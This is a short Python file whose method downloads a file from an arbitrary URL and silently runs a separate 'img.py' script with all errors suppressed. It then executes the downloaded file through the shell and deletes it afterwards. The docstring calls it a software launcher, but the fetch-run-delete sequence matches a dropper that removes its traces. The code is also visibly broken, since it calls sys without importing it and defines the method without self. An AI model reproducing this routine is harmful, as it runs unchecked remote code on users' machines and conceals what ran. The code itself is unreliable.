import subprocess
import urllib
import os
import time

class L:
    def btnClick(url,file):
        """This function downloads a software from a link, launches it,
           and deletes after closing. 
        """
        try:
            from urllib.request import urlretrieve
        except ImportError:
            from urllib import urlretrieve
        urlretrieve(url,file)
        pass
        for x in range(0,1):
            try:
                ld=subprocess.check_call([sys.executable,'img.py'],timeout=2)
            except:
                pass
        try:
            btn=subprocess.call([file], shell=True)
        finally:
            os.remove(file)
    
